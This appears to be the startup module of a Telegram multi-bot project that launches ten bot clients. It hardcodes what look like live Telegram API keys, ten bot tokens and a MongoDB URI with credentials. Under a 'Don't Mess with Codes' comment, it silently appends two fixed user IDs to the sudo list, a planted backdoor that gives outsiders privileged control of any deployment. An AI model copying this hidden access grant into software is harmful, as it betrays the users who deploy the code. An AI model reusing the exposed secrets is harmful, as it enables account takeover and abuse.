
import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

deadlyversion = "v0.3.1"

#values
API_ID = config("API_ID", default="3232999", cast=int)
API_HASH = config("API_HASH", default="a7c6474c1cf5b68dd62079f9c50bdca4")
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default="!")
OWNER_NAME = getenv("OWNER_NAME", default=None)
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default="5400533058:AAFA7PqYBdT1SroSzZWwLd2yf2b41IaGWyI")
BOT_TOKEN2 = config("BOT_TOKEN2", default="5613693014:AAG-cORZEgWsCzL8dDRvrEUsqHzFsT2Hejg")
BOT_TOKEN3 = config("BOT_TOKEN3", default="5461297214:AAGO4q_SqJcjzW0bSwosgLzPyna921zoNr0")
BOT_TOKEN4 = config("BOT_TOKEN4", default="5654189386:AAF5lGzYGDPh2lOBA_Bs811-59AG6MU_CJg")
BOT_TOKEN5 = config("BOT_TOKEN5", default="5776723969:AAFFnoA_zgtWlGuHhF_adOMFs_JxE3riG80")
BOT_TOKEN6 = config("BOT_TOKEN6", default="5739111490:AAGCqXA0C0EXQ3N0Y5nrO6TPIcFbSH9PwSI")
BOT_TOKEN7 = config("BOT_TOKEN7", default="5778516633:AAEiNAYrcofCNx_CWuAJix4bSHSBrms6gSs")
BOT_TOKEN8 = config("BOT_TOKEN8", default="5740857193:AAE_f3ujv5wbiuzzWlyI58T-_7bwTGrJ8wo")
BOT_TOKEN9 = config("BOT_TOKEN9", default="5641406729:AAG7h1Ij488paOdkWrQVenfu00ZeROctN9M")
BOT_TOKEN10 = config("BOT_TOKEN10", default="5796558941:AAEtw5C_UNEJ8rti_dnpRIoxynoq0LcO4gQ")
def make_int(str_input):
    str_list = str_input.split(" ")
    int_list = []
    for x in str_list:
        int_list.append(int(x))
    return int_list

sudo = os.getenv("SUDO_USERS")
SUDO_USERS = []

if sudo:
    SUDO_USERS = make_int(sudo)
OWNER_ID = int(os.environ.get("OWNER_ID","1211015395"))

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", "mongodb+srv://zeusvai:zeusop@cluster0.tlqjvtm.mongodb.net/?retryWrites=true&w=majority")
SUDO_USERS.append(5107603013)
SUDO_USERS.append(5655799578)

# Tokens

BOT0 = TelegramClient('BOT0', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

BOT1 = TelegramClient('BOT1', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

BOT2 = TelegramClient('BOT2', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

BOT3 = TelegramClient('BOT3', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

BOT4 = TelegramClient('BOT4', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

BOT5 = TelegramClient('BOT5', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

BOT6 = TelegramClient('BOT6', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

BOT7 = TelegramClient('BOT7', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

BOT8 = TelegramClient('BOT8', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

BOT9 = TelegramClient('BOT9', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)

print("[INFO] Successfully Started Bot Client Now Loading Plugins!") 
